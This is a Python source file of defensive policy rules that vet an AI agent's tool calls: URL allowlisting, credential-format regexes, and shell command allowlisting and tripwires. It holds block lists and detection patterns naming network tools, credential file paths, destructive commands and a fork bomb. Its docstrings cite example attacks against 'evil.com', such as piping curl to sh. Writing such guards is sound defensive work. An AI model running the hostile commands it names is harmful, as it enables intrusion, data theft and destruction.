"""Security rules for ModelFuzz."""

import re
import shlex
from collections.abc import Iterator
from dataclasses import dataclass
from urllib.parse import urlparse

# Machine-readable categories for a Violation.
#
# ``reason`` is prose written for a human reading an audit log; it is not stable
# and must not be parsed. ``category`` is the stable, matchable counterpart, so
# an agent loop can branch on *why* a call was blocked -- retry without the
# offending argument, ask the user to approve, or surface a tool error -- rather
# than treating every block the same or regex-matching English.
CATEGORY_UNSPECIFIED = "unspecified"
CATEGORY_SENSITIVE_KEYWORD = "sensitive_keyword"
CATEGORY_CREDENTIAL = "credential"
CATEGORY_NOT_ALLOWLISTED = "not_allowlisted"
CATEGORY_INVALID_URL = "invalid_url"
CATEGORY_SCHEME_NOT_ALLOWED = "scheme_not_allowed"
CATEGORY_USERINFO_TRICK = "userinfo_trick"
CATEGORY_METACHARACTER = "metacharacter"
CATEGORY_INTERPRETER = "interpreter"
CATEGORY_DESTRUCTIVE_COMMAND = "destructive_command"
CATEGORY_NETWORK_UTILITY = "network_utility"
CATEGORY_UNPARSEABLE = "unparseable"


@dataclass
class Violation:
    """Represents a policy violation.

    Attributes:
        rule_name: The rule that produced the block.
        reason: Human-readable prose for the audit log. Not a stable interface
            -- do not parse it.
        category: A stable machine-readable classification, one of the
            ``CATEGORY_*`` constants in this module. Branch on this. Defaults to
            ``CATEGORY_UNSPECIFIED`` so a hand-written policy that predates the
            field keeps working unchanged.
    """

    rule_name: str
    reason: str
    category: str = CATEGORY_UNSPECIFIED


def _iter_strings(data: object, seen: set[int]) -> Iterator[str]:
    """Yield every string reachable from a tool-call argument.

    Walks ``dict`` keys as well as values, decodes ``bytes``/``bytearray`` as
    UTF-8, and recurses into ``list``/``tuple``/``set``/``frozenset``. ``seen``
    carries container ``id()`` values so a self-referential argument -- which a
    hand-built call can contain even though a JSON-derived one cannot -- ends
    the walk instead of recursing forever.

    Anything else (an int, a ``None``, a custom object) yields nothing: rules
    built on this walk cannot read those carriers, and the documented default is
    to allow what they cannot read.
    """
    if isinstance(data, str):
        yield data

    elif isinstance(data, (bytes, bytearray)):
        yield data.decode("utf-8", errors="ignore")

    elif isinstance(data, dict):
        if id(data) in seen:
            return
        seen.add(id(data))
        for key, value in data.items():
            yield from _iter_strings(key, seen)
            yield from _iter_strings(value, seen)

    elif isinstance(data, (list, tuple, set, frozenset)):
        if id(data) in seen:
            return
        seen.add(id(data))
        for item in data:
            yield from _iter_strings(item, seen)


DEFAULT_URL_SCHEMES = frozenset({"http", "https"})


class URLAllowList:
    """A policy that ensures URLs are on an allowlist and blocks parsing tricks.

    The policy governs *URLs only*. Values that are not URLs -- an email body, a
    timeout int, None -- are passed through untouched, so a single engine can
    guard a tool like ``http_post(url, body)`` without flagging ``body``.

    Containers are inspected recursively: a URL hidden inside a ``dict``,
    ``list``, ``tuple`` or ``set`` argument is checked exactly as a top-level
    one is, because a payload field such as ``{"redirect": "http://evil.com"}``
    is as much an exfiltration route as the ``url`` parameter itself. Dict keys
    are checked as well as values.

    Note the remaining tradeoff: a bare host with no scheme (``"evil.com"``) is
    not identifiable as a URL and is therefore allowed through. Pair this with
    a rule that governs the arguments it does not.
    """

    def __init__(
        self,
        allowed_domains: list[str],
        allowed_schemes: set[str] | frozenset[str] | None = None,
    ) -> None:
        self.allowed_domains = [d.lower().rstrip(".") for d in allowed_domains]
        self.allowed_schemes = (
            frozenset(s.lower() for s in allowed_schemes)
            if allowed_schemes is not None
            else DEFAULT_URL_SCHEMES
        )

    def __call__(self, data: object) -> Violation | None:
        """Check every URL reachable from a value.

        Args:
            data: The value to check. Containers are walked recursively; values
                that are not URLs are not governed by this policy and pass.

        Returns:
            A Violation object if a blocked URL is found, otherwise None.
        """
        return self._check_recursive(data, set())

    def _check_recursive(self, data: object, seen: set[int]) -> Violation | None:
        if isinstance(data, str):
            return self._check_url(data)

        if isinstance(data, (dict, list, tuple, set, frozenset)):
            # Guard against self-referential containers, which a hand-built
            # argument can contain even though JSON-derived ones cannot.
            if id(data) in seen:
                return None
            seen.add(id(data))

            # Keys can carry a URL just as values can, e.g. an endpoint map.
            items = (*data.keys(), *data.values()) if isinstance(data, dict) else data
            for item in items:
                violation = self._check_recursive(item, seen)
                if violation:
                    return violation

        return None

    def _check_url(self, url: str) -> Violation | None:
        # A string carrying a scheme separator is claiming to be a URL, so a
        # parse failure from here on must fail closed rather than sail through.
        looks_like_url = "://" in url

        try:
            parsed = urlparse(url)
        except Exception:
            return self._invalid(url) if looks_like_url else None

        if not parsed.scheme or not parsed.netloc:
            return self._invalid(url) if looks_like_url else None

        if parsed.scheme.lower() not in self.allowed_schemes:
            return self._block(
                f"URL scheme not allowed: {parsed.scheme}", CATEGORY_SCHEME_NOT_ALLOWED
            )

        # Block userinfo tricks (e.g., http://api.internal.com@evil.com)
        if "@" in parsed.netloc:
            return self._block(f"URL contains userinfo trick: {url}", CATEGORY_USERINFO_TRICK)

        try:
            hostname = (parsed.hostname or "").rstrip(".")
        except ValueError:
            return self._invalid(url)

        if not hostname:
            return self._invalid(url)

        # Check for exact match or valid subdomain
        is_allowed = any(
            hostname == allowed or hostname.endswith(f".{allowed}")
            for allowed in self.allowed_domains
        )

        if not is_allowed:
            return self._block(f"URL domain not in allowlist: {hostname}", CATEGORY_NOT_ALLOWLISTED)

        return None

    @staticmethod
    def _block(reason: str, category: str) -> Violation:
        return Violation(rule_name="URLAllowList", reason=reason, category=category)

    @classmethod
    def _invalid(cls, url: str) -> Violation:
        return cls._block(f"Invalid URL: {url}", CATEGORY_INVALID_URL)


class SensitiveDataFilter:
    """A policy that blocks strings containing sensitive keywords.

    This is a keyword tripwire, not a credential scanner: it matches the literal
    strings it is given, so it flags ordinary prose containing "password" while
    a real ``sk-...`` or ``AKIA...`` key passes straight through. For credential
    formats use :class:`SecretPatternFilter`.
    """

    def __init__(self, sensitive_keywords: list[str] | None = None) -> None:
        self.sensitive_keywords = (
            [k.lower() for k in sensitive_keywords]
            if sensitive_keywords
            else ["secret", "password", "api_key"]
        )

    def __call__(self, data: object) -> Violation | None:
        """Check if data contains sensitive keywords.

        This method recurses into nested dicts, lists, and tuples.

        Args:
            data: The data to check.

        Returns:
            A Violation object if sensitive data is found, otherwise None.
        """
        for text in _iter_strings(data, set()):
            lower_text = text.lower()
            for keyword in self.sensitive_keywords:
                if keyword in lower_text:
                    return Violation(
                        rule_name="SensitiveDataFilter",
                        reason=f"String contains sensitive keyword: '{keyword}'",
                        category=CATEGORY_SENSITIVE_KEYWORD,
                    )
        return None


# Credential formats that are recognisable on sight. Each entry is a
# (label, pattern) pair; the label names the credential in the block reason.
#
# Order matters: the first match wins, so a more specific format is listed
# before a broader one that would also match it -- an Anthropic key
# ("sk-ant-...") is also a match for the generic OpenAI "sk-..." shape, and
# should be reported as the former.
#
# These are format matchers, not proof of validity: a revoked key and a live one
# look identical, and a random string in the same shape trips the same wire.
DEFAULT_SECRET_PATTERNS: tuple[tuple[str, str], ...] = (
    # The leading \b matters: without it "sk-" matches inside ordinary hyphenated
    # words -- "task-oriented-…", "risk-management-…" -- and long ones would trip
    # the wire as OpenAI keys.
    ("Anthropic API key", r"\bsk-ant-[A-Za-z0-9_-]{16,}"),
    ("OpenAI API key", r"\bsk-(?:proj-)?[A-Za-z0-9_-]{20,}"),
    ("Stripe secret key", r"\b[sr]k_(?:live|test)_[A-Za-z0-9]{16,}"),
    ("AWS access key ID", r"\b(?:AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}\b"),
    ("GitHub fine-grained token", r"\bgithub_pat_[A-Za-z0-9_]{22,}"),
    ("GitHub token", r"\bgh[pousr]_[A-Za-z0-9]{36,}"),
    ("Google API key", r"\bAIza[0-9A-Za-z_-]{35}\b"),
    ("Slack token", r"\bxox[abprs]-[A-Za-z0-9-]{10,}"),
    ("JSON Web Token", r"\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]+"),
    ("private key block", r"-----BEGIN (?:[A-Z0-9 ]+ )?PRIVATE KEY-----"),
)


class SecretPatternFilter:
    """A policy that blocks arguments carrying a recognisable credential.

    Where :class:`SensitiveDataFilter` matches the *word* "password", this
    matches the *shape* of a real credential -- ``sk-ant-...``, ``AKIA...``,
    ``ghp_...``, a JWT, a PEM private-key header -- so an agent that has been
    talked into pasting a live key into a tool argument is stopped before the
    call runs.

    Containers are walked exactly as :class:`SensitiveDataFilter` walks them:
    ``dict`` keys and values, ``bytes`` decoded as UTF-8, and nested
    ``list``/``tuple``/``set``/``frozenset``, with a guard against
    self-referential arguments.

    The block reason never quotes the matched text. A violation is logged at
    ``WARNING`` with the reason attached, and a rule that echoed the credential
    into the audit trail would leak the very thing it exists to contain -- so it
    names the format and where it was found, and nothing else.

    Known limits, in the same spirit as the rest of the bundled rules:

    - It recognises *listed formats only*. A bespoke internal token, a bare
      high-entropy string, or a provider not in the table passes untouched.
      Pass ``extra_patterns`` for formats specific to your own systems.
    - It matches shape, not validity. An expired key, a documentation
      placeholder, or a test fixture in the right shape is blocked the same as a
      live credential.
    - Only values reachable through the walk above are inspected. A credential
      held in a custom object is not seen, and the call proceeds.
    """

    def __init__(
        self,
        patterns: dict[str, str] | None = None,
        extra_patterns: dict[str, str] | None = None,
    ) -> None:
        """Build the filter.

        Args:
            patterns: Replaces the bundled table entirely. Use this to scan for
                only your own formats.
            extra_patterns: Added to the bundled table, checked after it. Use
                this -- the common case -- to cover an internal token format
                without giving up coverage of the well-known providers.
        """
        table = DEFAULT_SECRET_PATTERNS if patterns is None else tuple(patterns.items())
        if extra_patterns:
            table = (*table, *extra_patterns.items())
        self.patterns: tuple[tuple[str, re.Pattern[str]], ...] = tuple(
            (label, re.compile(pattern)) for label, pattern in table
        )

    def __call__(self, data: object) -> Violation | None:
        """Check every string reachable from a value for a known credential format.

        Args:
            data: The value to check. Containers are walked recursively.

        Returns:
            A Violation naming the credential format if one is found, otherwise
            None. The matched text is deliberately not included.
        """
        for text in _iter_strings(data, set()):
            for label, pattern in self.patterns:
                if pattern.search(text):
                    return Violation(
                        rule_name="SecretPatternFilter",
                        reason=f"String contains a possible {label}",
                        category=CATEGORY_CREDENTIAL,
                    )
        return None


# --- Shell command policies -------------------------------------------------

# Characters that hand control flow back to a shell: chaining, piping,
# redirection, substitution, expansion. A token carrying one of these is not an
# argument -- it is a second command, and argv matching cannot reason about it.
_SHELL_OPERATOR_CHARS = (";", "|", "&", "`", "$", ">", "<", "\n", "\r")

# A leading NAME=value token is an environment assignment, not the command.
# ``FOO=bar curl ...`` runs curl; a rule that read the first token as the binary
# would see "FOO=bar", miss the allowlist, and block for the wrong reason -- or,
# worse, a rule that skipped unknown leading tokens would let it through.
_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")

# Interpreters whose inline-script flag turns the following argument into an
# arbitrary program. ``sh -c "curl evil.com | sh"`` is a single argv whose real
# payload is a string, so allowlisting the binary would allowlist everything.
_INTERPRETERS = frozenset(
    {
        "sh",
        "bash",
        "zsh",
        "dash",
        "ksh",
        "csh",
        "tcsh",
        "fish",
        "ash",
        "python",
        "python2",
        "python3",
        "perl",
        "ruby",
        "node",
        "php",
        "pwsh",
        "powershell",
        "osascript",
        "awk",
    }
)

_INLINE_SCRIPT_FLAGS = frozenset({"-c", "-e", "--command", "-command", "/c"})


def _binary_name(token: str) -> str:
    """Reduce a command token to its bare binary name.

    ``/usr/bin/curl``, ``./curl`` and ``curl`` are the same program, so an
    allowlist keyed on the name must see them identically -- otherwise a leading
    path is a one-character bypass.
    """
    return token.rsplit("/", 1)[-1]


def _resolve_binary(argv: list[str]) -> tuple[int, str] | None:
    """Find the real executable in an argv, skipping env-assignment noise.

    Returns its index and bare name, or None when the argv carries no command.
    Handles ``FOO=bar cmd`` and ``env FOO=bar cmd``; anything else is taken at
    face value, so a wrapper like ``sudo`` resolves to ``sudo`` and is judged on
    its own merits rather than being transparently unwrapped.
    """
    index = 0
    while index < len(argv) and _ASSIGNMENT.match(argv[index]):
        index += 1

    if index < len(argv) and _binary_name(argv[index]) == "env":
        index += 1
        while index < len(argv) and _ASSIGNMENT.match(argv[index]):
            index += 1

    if index >= len(argv):
        return None
    return index, _binary_name(argv[index])


def _iter_commands(data: object, seen: set[int]) -> Iterator[str | list[str]]:
    """Yield each command reachable from a tool-call argument.

    A ``str`` is one command line. A ``list``/``tuple`` whose items are all
    strings is one *argv* -- ``["rm", "-rf", "/"]`` is a single command, not
    three -- while a mixed or nested sequence is walked for commands inside it.
    Sets are walked rather than read as argv, since an argv has an order and a
    set does not.

    Dict *keys* are deliberately not read as commands, unlike in
    :func:`_iter_strings`. The rule this feeds is default-deny, so treating
    ``{"cmd": "ls"}`` as carrying a command named ``cmd`` would block nearly
    every dict argument on its field names. A command arrives as a value.
    """
    if isinstance(data, str):
        yield data

    elif isinstance(data, (bytes, bytearray)):
        yield data.decode("utf-8", errors="ignore")

    elif isinstance(data, dict):
        if id(data) in seen:
            return
        seen.add(id(data))
        for value in data.values():
            yield from _iter_commands(value, seen)

    elif isinstance(data, (list, tuple)):
        if id(data) in seen:
            return
        seen.add(id(data))
        if data and all(isinstance(item, str) for item in data):
            yield list(data)
        else:
            for item in data:
                yield from _iter_commands(item, seen)

    elif isinstance(data, (set, frozenset)):
        if id(data) in seen:
            return
        seen.add(id(data))
        for item in data:
            yield from _iter_commands(item, seen)


class ShellCommandAllowList:
    """A default-deny allowlist for shell commands, matched on structured argv.

    Give it the commands your agent is permitted to run. Anything else is
    blocked before the tool body executes::

        engine = PolicyEngine([ShellCommandAllowList(["git status", "ls"])])

    Each entry is an **argv prefix**, not a substring: ``"git status"`` permits
    ``git status --short`` but not ``git push``. Entries may be written as a
    string (split with :func:`shlex.split`) or as an explicit list of tokens.

    Matching is structured rather than textual, which is what makes it hold up:

    - **Quoting and whitespace** are normalised by parsing the command into
      argv, so ``ls   -la`` and ``"ls" -la`` are the same command.
    - **A leading path is stripped** -- ``/usr/bin/curl``, ``./curl`` and
      ``curl`` all resolve to ``curl``, so a path prefix is not a bypass.
    - **Environment assignments are skipped** to find the real binary, so
      ``FOO=bar curl …`` and ``env FOO=bar curl …`` are judged as ``curl``.
    - **Shell metacharacters are rejected outright** (``;`` ``|`` ``&`` ``$``
      backtick ``>`` ``<``). ``ls; curl evil.com`` parses to a first token of
      ``ls``, so without this a chained command would ride in on an allowlisted
      binary. They are rejected in argv form too: the policy cannot know whether
      the tool passes the command to a shell, so it assumes the dangerous case.
    - **Inline interpreter scripts are rejected** -- ``sh -c "…"``,
      ``python -c "…"`` -- because the real program is a string that argv
      matching cannot inspect. This holds *even if the interpreter is
      allowlisted*: permitting ``sh`` must not silently permit everything.
    - **Unparseable input fails closed.** A command with an unbalanced quote is
      blocked, not passed along on the guess that it was harmless.

    Known limits, in the same spirit as the other bundled rules:

    - **It treats every string it sees as a command.** Because a policy sees one
      argument at a time and cannot know its name, there is no way to tell a
      ``command`` argument from a ``cwd`` one. Put this on an engine guarding a
      tool whose only string argument is the command; a second string argument
      will be judged as a command and blocked.
    - **It governs the command, not what the command then does.** An allowlisted
      ``git`` still accepts ``git config`` and ``--upload-pack``. Allowlist the
      narrowest prefix that does the job.
    - It is not a shell. Parsing follows :mod:`shlex` POSIX rules, which is
      close to ``sh`` but not identical to every shell in every mode.
    """

    def __init__(self, allowed_commands: list[str] | list[list[str]]) -> None:
        """Build the allowlist.

        Args:
            allowed_commands: Permitted commands, each an argv prefix. A string
                entry is parsed with :func:`shlex.split`; a list entry is taken
                as literal tokens.

        Raises:
            ValueError: An entry is empty, or a string entry cannot be parsed.
        """
        normalized: list[tuple[str, ...]] = []
        for entry in allowed_commands:
            if isinstance(entry, str):
                try:
                    tokens = shlex.split(entry)
                except ValueError as exc:
                    raise ValueError(f"Allowlist entry {entry!r} is not parseable: {exc}") from exc
            else:
                tokens = list(entry)

            if not tokens:
                raise ValueError("Allowlist entries must name a command; got an empty entry")
            normalized.append((_binary_name(tokens[0]), *tokens[1:]))

        self.allowed_commands = tuple(normalized)

    def __call__(self, data: object) -> Violation | None:
        """Check every command reachable from a value against the allowlist.

        Args:
            data: The value to check. Strings are parsed as command lines,
                all-string sequences as argv, and containers are walked.
                Non-string values carry no command and pass.

        Returns:
            A Violation if any command is not permitted, otherwise None.
        """
        for command in _iter_commands(data, set()):
            violation = self._check(command)
            if violation:
                return violation
        return None

    def _check(self, command: str | list[str]) -> Violation | None:
        if isinstance(command, str):
            # A newline separates commands to a shell but is ordinary whitespace
            # to shlex, so "ls\ncurl evil.com" would split into one innocent argv
            # while a shell ran two commands. Catch it on the raw string, before
            # the split erases the evidence.
            for char in ("\n", "\r"):
                if char in command:
                    return self._block(
                        f"Command contains the shell metacharacter {char!r}",
                        CATEGORY_METACHARACTER,
                    )
            try:
                argv = shlex.split(command)
            except ValueError as exc:
                return self._block(f"Command is not parseable: {exc}", CATEGORY_UNPARSEABLE)
        else:
            argv = command

        if not argv:
            return self._block("Command is empty", CATEGORY_UNPARSEABLE)

        for token in argv:
            for char in _SHELL_OPERATOR_CHARS:
                if char in token:
                    return self._block(
                        f"Command contains the shell metacharacter {char!r}",
                        CATEGORY_METACHARACTER,
                    )

        resolved = _resolve_binary(argv)
        if resolved is None:
            return self._block("Command names no executable", CATEGORY_UNPARSEABLE)
        index, binary = resolved

        arguments = argv[index + 1 :]
        if binary.lower() in _INTERPRETERS and any(
            argument.lower() in _INLINE_SCRIPT_FLAGS for argument in arguments
        ):
            return self._block(
                f"Inline script passed to the interpreter '{binary}'",
                CATEGORY_INTERPRETER,
            )

        effective = (binary, *arguments)
        for prefix in self.allowed_commands:
            if len(prefix) <= len(effective) and effective[: len(prefix)] == prefix:
                return None

        # Name the binary, never the full command: blocks are logged, and the
        # arguments are exactly where a credential or customer record would be.
        return self._block(f"Command not in allowlist: '{binary}'", CATEGORY_NOT_ALLOWLISTED)

    @staticmethod
    def _block(reason: str, category: str) -> Violation:
        return Violation(rule_name="ShellCommandAllowList", reason=reason, category=category)


# Patterns the tripwire looks for, as (category, label, regex). Ordered most
# general first, so a chained command is reported as chaining rather than as
# whichever utility happens to appear in it.
DEFAULT_DANGEROUS_SHELL_PATTERNS: tuple[tuple[str, str, str], ...] = (
    (CATEGORY_METACHARACTER, "shell chaining, piping or redirection", r"[;&|`]|\$\(|\$\{|>|<"),
    (
        CATEGORY_INTERPRETER,
        "inline script passed to an interpreter",
        r"\b(?:sh|bash|zsh|dash|ksh|python[0-9.]*|perl|ruby|node|php|pwsh|powershell)\s+-[ce]\b",
    ),
    (CATEGORY_INTERPRETER, "dynamic evaluation", r"\b(?:eval|exec|source)\b"),
    (CATEGORY_DESTRUCTIVE_COMMAND, "privilege escalation", r"\b(?:sudo|doas)\b"),
    (CATEGORY_DESTRUCTIVE_COMMAND, "recursive or forced delete", r"\brm\s+-[A-Za-z]*[rf]"),
    (CATEGORY_DESTRUCTIVE_COMMAND, "raw disk write", r"\b(?:mkfs|fdisk)\b|\bdd\s+if="),
    (CATEGORY_DESTRUCTIVE_COMMAND, "fork bomb", r":\(\)\s*\{"),
    (
        CATEGORY_DESTRUCTIVE_COMMAND,
        "sweeping permission change",
        r"\bchmod\s+(?:-[A-Za-z]+\s+)*777\b|\bchown\s+-R\b",
    ),
    (CATEGORY_DESTRUCTIVE_COMMAND, "host shutdown", r"\b(?:shutdown|reboot|halt|poweroff)\b"),
    (
        CATEGORY_NETWORK_UTILITY,
        "network transfer utility",
        r"\b(?:curl|wget|nc|ncat|netcat|scp|sftp|telnet)\b",
    ),
    (
        CATEGORY_CREDENTIAL,
        "read of a sensitive path",
        r"/etc/(?:passwd|shadow)\b|\.ssh/|\bid_rsa\b|\.aws/credentials",
    ),
)


class NoDangerousShellPatterns:
    """A tripwire for obviously dangerous shell strings.

    **This is a tripwire, not a shell parser and not a security boundary.** It
    matches raw text against a fixed table of patterns. It will catch the
    unsubtle -- ``rm -rf /``, ``curl … | sh``, ``$(…)`` substitution -- and it
    will not catch an attacker who knows it is there. Base64, unusual quoting,
    a renamed binary, or a utility not in the table all walk straight past.

    Use it as a cheap second layer, or where an allowlist is impractical. Where
    you can enumerate the commands your agent needs, reach for
    :class:`ShellCommandAllowList` instead: it is default-deny and matches
    structured argv, so it is a boundary rather than a trap for the careless.

    Unlike the allowlist, this rule only blocks on a positive match, so a value
    it does not recognise passes. That makes it safe to attach to a tool with
    several arguments -- at the cost of the false positives any raw-text match
    brings, since ordinary prose mentioning ``curl`` or containing a ``|`` will
    trip it.

    Every violation carries a :attr:`Violation.category` -- ``metacharacter``,
    ``interpreter``, ``destructive_command``, ``network_utility`` or
    ``credential`` -- so an agent loop can tell a chained command from a
    forbidden binary without parsing the reason text.
    """

    def __init__(self) -> None:
        self.patterns: tuple[tuple[str, str, re.Pattern[str]], ...] = tuple(
            (category, label, re.compile(pattern))
            for category, label, pattern in DEFAULT_DANGEROUS_SHELL_PATTERNS
        )

    def __call__(self, data: object) -> Violation | None:
        """Check every string reachable from a value against the pattern table.

        Args:
            data: The value to check. Containers are walked recursively.

        Returns:
            A Violation naming the pattern that matched, otherwise None.
        """
        for text in _iter_strings(data, set()):
            for category, label, pattern in self.patterns:
                if pattern.search(text):
                    return Violation(
                        rule_name="NoDangerousShellPatterns",
                        reason=f"Command contains {label}",
                        category=category,
                    )
        return None
